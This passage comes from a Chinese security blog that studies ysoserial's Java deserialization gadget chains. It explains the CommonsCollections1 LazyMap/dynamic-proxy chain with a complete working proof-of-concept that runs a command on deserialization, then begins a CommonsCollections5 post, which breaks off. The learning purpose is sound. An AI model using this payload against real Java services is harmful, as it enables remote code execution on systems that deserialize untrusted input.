<p>第二点会好理解点：之前说过，修改 map 中的key或者value时会自动触发我们自定义的<code>transform</code>方法，因为<code>Retention</code>注解中的方法名为<strong>value</strong>，在上面转换中，将此方法名放入了转换后 map 的 key中，所以想要改动map中的value，必须使用相同的key值即<strong>value</strong>。</p>
<blockquote>
<p>  这点配合参考中的：<a href="https://xz.aliyun.com/t/7031#toc-7%E9%A3%9F%E7%94%A8%E6%9B%B4%E4%BD%B3%EF%BC%8C%E4%BD%9C%E8%80%85%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%BF%B0%E4%BA%86%E6%B3%A8%E8%A7%A3">https://xz.aliyun.com/t/7031#toc-7食用更佳，作者详细讲述了注解</a></p>
</blockquote>
<p>至此，经过P牛简化后的<strong>利用链</strong>，已经大致清晰，并且可以用以实战，但是上述生成的序列化数据只能在<strong>Java 8u71</strong>之前使用，在8u71以后大概是2015年12月的时候，Java 官方修改了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的<code>readObject</code>函数:<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p>
<p>修改jdk版本，重新运行，可以看到并没有执行命令<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214205.png" alt="image-20210610213815088"></p>
<p>改动后的<strong>readObject</strong>函数不再有针对我们构造的map的赋值语句，所以触发不了漏洞。而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。</p>
<p>所以，后续对Map的操作都是基于这个新的 LinkedHashMap 对象，而原来我们精心构造的Map不再执 行set或put操作，也就不会触发RCE了。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110500.png" alt="image-20210610215539317"></p>
<h2 id="0x05-ysoserial项目中的CC1链"><a href="#0x05-ysoserial项目中的CC1链" class="headerlink" title="0x05 ysoserial项目中的CC1链"></a>0x05 ysoserial项目中的CC1链</h2><p>可以看到利用链中并没有之前分析的一个关键点<strong>TransformedMap</strong>，而是变成了<strong>LazyMap</strong>，这就导致了之后的利用链完全不同</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">               AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">                  LazyMap.get()</span></span><br><span class="line"><span class="comment">                     ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Requires:</span></span><br><span class="line"><span class="comment">      commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110455.png" alt="image-20210611074945777"></p>
<h3 id="5-1-ysoserial中的LazyMap"><a href="#5-1-ysoserial中的LazyMap" class="headerlink" title="5.1 ysoserial中的LazyMap"></a>5.1 ysoserial中的LazyMap</h3><p>LazyMap和TransformedMap类似，都来自于CommonCollections库，并继承自AbstractMapDecorator。</p>
<p><strong>TransformedMap</strong>是只要调用decorate()函数，传入key和value的变换函数Transformer，然后Map中的任意项的Key或者Value被修改，相应的Transformer(keyTransformer或者valueTransformer)的<strong>transform</strong>方法就会被调用。</p>
<p><strong>LazyMap</strong>是只要执行 get 方法就会调用<strong>transform</strong>，这个利用链利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用精心构造对象的 LazyMap 的get方法。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110452.png" alt="image-20210611080807562"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110448.png" alt="image-20210611101901231"></p>
<p>但是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>方法中并没有直接调用到Map(this.memberValues)的get方法。</p>
<p>所以ysoserial找到了另一条路，因为AnnotationInvocationHandler类 同时也实现了<code>InvocationHandler</code>接口（动态代理），在<code>invoke</code>方法有调用到get<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110445.png" alt="image-20210611081300634"></p>
<p>从这点就可以看出<strong>LazyMap</strong>这条链比<strong>TransformedMap</strong>较为复杂，在<strong>TransformedMap</strong>那条利用链中，我们只需要将map对象利用反射放入<code>AnnotationInvocationHandler</code>中，然后序列化数据即可。</p>
<p>而<strong>LazyMap</strong>若想要调用到<code>invoke</code>还需要用到Java中的动态代理，来一起简单学习吧。</p>
<h3 id="5-2-Java动态代理"><a href="#5-2-Java动态代理" class="headerlink" title="5.2 Java动态代理"></a>5.2 Java动态代理</h3><p>先来理解下什么是动态代理</p>
<blockquote>
<p>  <strong>在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能。</strong></p>
<p>  举个例子来说（这个例子在开发中很常见）：我的开发们实现了业务部分的所有代码，忽然我期望在这些业务代码中添加日志记录功能的时候，一个一个类去添加代码就会非常麻烦，这个时候我们就能通过动态代理的方式对期待添加日志的类进行代理。</p>
</blockquote>
<p>在java的 java.lang.reflect 包下提供了一个<code>Proxy</code>类和一个<code>InvocationHandler</code>接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。 </p>
<p>P牛写了一个Demo，我们来看下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">// ExampleInvocationHandler类实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串Hacked Object </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="comment">// Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可;</span></span><br><span class="line">        <span class="comment">//第二个参数是我们需要 代理的对象集合;</span></span><br><span class="line">        <span class="comment">//第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行App，我们可以发现，虽然向Map放入的hello值为world，但获取到的结果却是：<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110439.png" alt="image-20210611083456820"></p>
<p>当一个类实现了<code>InvocationHandler</code>接口，并实现<code>invoke</code>方法，我们就可以通过动态代理的方式去劫持该类的内部函数调用，当执行该类的任意方法时都会调用<code>invoke</code>方法。</p>
<p>我们再来看看<code>AnnotationInvocationHandler</code>类，它实现了<code>InvocationHandler</code>,并且实现了<code>invoke</code>方法<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110435.png" alt="image-20210611084448243"></p>
<p>所以ysoserial通过动态代理劫持了AnnotationInvocationHandler的调用</p>
<h3 id="5-3-通过LazyMap构造利用链"><a href="#5-3-通过LazyMap构造利用链" class="headerlink" title="5.3 通过LazyMap构造利用链"></a>5.3 通过LazyMap构造利用链</h3><p>将之前 Demo 中的 TransformedMap 换成 LazyMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br></pre></td></tr></table></figure>

<p>通过动态代理劫持AnnotationInvocationHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过反射机制 实例化 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态代理劫持 （Proxy 实现了Serializable接口 是可以序列化的）</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) instance;</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">	Map.class.getClassLoader(),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">	handler</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>因为我们反序列化的入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject </code>,所以我们需要使用<code>AnnotationInvocationHandler</code>对这个<code>proxyMap</code>进行包裹:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span>  ctor.newInstance(Target.class, proxyMap);</span><br></pre></td></tr></table></figure>

<p>完整POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/10 23:00</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ysoserial</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Yso</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 不用再添加value了</span></span><br><span class="line">        <span class="comment">// innerMap.put(&quot;value&quot;, &quot;value&quot;);</span></span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射机制 实例化 AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态代理劫持 （Proxy 实现了Serializable接口 是可以序列化的）</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) instance;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span>  ctor.newInstance(Target.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payloadproxy.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payloadproxy.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行命令<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110313.png" alt="image-20210611095342352"></p>
<h3 id="5-4-其它"><a href="#5-4-其它" class="headerlink" title="5.4 其它"></a>5.4 其它</h3><p>有时候调试上述POC的时候，会发现弹出了两个计算器，或者没有执行到readObject的时候就弹出了计算器，这是由于IDEA中Debug就利用toString，在过程中会调用代理类的toString方法从而造成非预期的命令执行(在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110259.png" alt="image-20210611100555230"></p>
<p>ysoserial中对此也有一些处理，它在POC的最后才将执行命令的Transformer数组设置到transformerChain 中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br></pre></td></tr></table></figure>

<p>还有ysoserial在transform数组中多了一个元素<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110254.png" alt="image-20210611102209671"></p>
<p>P牛猜测是为了隐藏报错信息，在上述执行命令成功后，可以看到有一条报错信息，再加入这个元素后，隐蔽了启动进程的日志特征<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110306.png" alt="image-20210611102415982"></p>
<p>经过测试，<strong>LazyMap</strong>与<strong>TransformedMap</strong>都不能在高版本Java（8u71）之后利用，至于如何解决那是另一条CommonCollections利用链的学习了（CommonCollections6）。</p>
<p>上述分析过程用到的代码都已上传到 <a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.gettoby.com/p/0h2v47vgjznb">https://www.gettoby.com/p/0h2v47vgjznb</a></p>
<p>P牛知识星球-java安全漫谈</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserial学习之CommonsCollections5(四)</title>
    <url>/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/</url>
    <content><![CDATA[<blockquote>
<p>  庆祝我伟大的党百年华诞🎉</p>
<p>  向伟大的祖国敬礼(‘-‘*ゞ</p>
</blockquote>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上节说道在<strong>commons-collections-3.2.1.jar!&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;keyvalue&#x2F;TiedMapEntry.class</strong>类中，总共有三个函数调用了<strong>getValue</strong>函数：</p>
<ul>
<li><p><strong>toString</strong>    CC5   本文重点</p>
</li>
<li><p><strong>hashCode</strong>    CC6</p>
</li>
<li><p><strong>equals</strong>      CC7</p>
</li>
</ul>
<p>本文CommonsCollections6利用链的限制条件：</p>
<p>​	JDK版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
<p>实验环境:</p>
<p>​	JDK 1.8.0_261 、Commons-Collections 3.2.1 </p>
<h2 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>这里重点看**BadAttributeValueExpException.readObject()<strong>和</strong>TiedMapEntry.toString()**，其他的都和前面两章一样 <a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections1(二)</a>、<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484560&idx=1&sn=8a997456a5ccc09a4c11208e92c31093&chksm=c2829d89f5f5149f8000c1070e28eaf3049847b41e1377bf68f1074f7163ee7071eb61c84695&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections6(三)</a></p>
<h3 id="1-1-TiedMapEntry-toString"><a href="#1-1-TiedMapEntry-toString" class="headerlink" title="1.1 TiedMapEntry.toString()"></a>1.1 TiedMapEntry.toString()</h3><p>上一节说过解决<strong>Java高版本利用</strong>问题，实际上就是在找是否还有其他调用 <strong>LazyMap#get()</strong> 的地方，因为<strong>LazyMap</strong>对象是只要执行<strong>get</strong>方法就会调用<strong>transform</strong>，而<strong>transform</strong>的特性是可以执行任意方法。</p>
<p>CC6中是在<strong>TiedMapEntry</strong>类中找到了<strong>hashCode</strong>方法中调用了<strong>map.get(key);</strong>,并且<strong>map</strong>是我们可控的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204945.png" alt="image-20210630213657788"></p>
<p>而CC5中则是利用了<strong>TiedMapEntry#toString</strong>方法<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204954.png" alt="image-20210630212357694"></p>
<p>还是先实验一下，确定可以<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205000.png" alt="image-20210630214320487"></p>
<p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发 <strong>TiedMapEntry#toString</strong> 从而触发命令的执行。</p>
<h3 id="1-2-BadAttributeValueExpException-readObject"><a href="#1-2-BadAttributeValueExpException-readObject" class="headerlink" title="1.2 BadAttributeValueExpException.readObject()"></a>1.2 BadAttributeValueExpException.readObject()</h3><p>在ysoserial中是利用了 <strong>rt.jar!&#x2F;javax&#x2F;management&#x2F;BadAttributeValueExpException.class#readObject</strong>方法来达到上述目的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205412.png" alt="image-20210630214951419"></p>
<blockquote>
<p>这里我们可以看到<strong>BadAttributeValueExpException</strong>并没有实现<strong>Serializable</strong>接口,为什么可以序列化？<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205417.png" alt="image-20210701200642699"></p>
<p>其实是<strong>BadAttributeValueExpException</strong>继承了<strong>Exception</strong>，<strong>Exception</strong>又继承了<strong>Throwable</strong>，<strong>Throwable</strong>实现了<strong>Serializable</strong>接口<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205421.png" alt="image-20210701200756489"></p>
</blockquote>
<p>在<strong>BadAttributeValueExpException#readObject</strong>中发现<strong>get</strong>函数获取<strong>val</strong>的值然后赋给<strong>valObj</strong>，然后在符合<strong>第二个else if</strong>的情况下就会调用<strong>toString</strong>, 巧的是 <strong>System.getSecurityManager()</strong> 返回值默认为<strong>null</strong><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205426.png" alt="image-20210701201112074"></p>
<p>这样就只需要可以控制<strong>val</strong>的值就可以执行命令了。</p>
<p>然后我们发现在构造函数中就可以控制<strong>val</strong>的值，可以直接将<strong>tiedMapEntry</strong>作为参数传进去。</p>
<p><strong>注意</strong>:在构造函数中我们可以看到，当传入一个<strong>val</strong>，<strong>val</strong>就不等于<strong>null</strong>，会调用一次<strong>toString()<strong>方法,也就是说，创建</strong>BadAttributeValueExpException</strong>对象时会弹出一次计算器，而在我们的构想中，反序列化时也会弹出一次，总共是<strong>两</strong>次。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205431.png" alt="image-20210630220727451"></p>
<p>实验一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205435.png" alt="image-20210630221313347"></p>
<p>但是，最终发现只弹了一次计算器，也就是说在反序列化时并没有执行<strong>toString</strong>方法，进而执行命令。</p>
<p>直接在<strong>BadAttributeValueExpException#readObject</strong>下断点Debug一下,会发现这时<strong>valObj</strong>是一个字符串了，直接进入了<strong>第一个 else if <strong>判断中，并没有进入</strong>第二个 else if <strong>，这是因为在创建</strong>BadAttributeValueExpException</strong>对象时，<strong>val</strong>已经执行过了一次<strong>toString</strong>方法，变成了字符串，所以匹配到了**第一个 else if **判断<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205443.png" alt="image-20210630221828997"></p>
<p>要想改变<strong>val</strong>的值就需要用到前面反复提到的<strong>反射</strong>了</p>
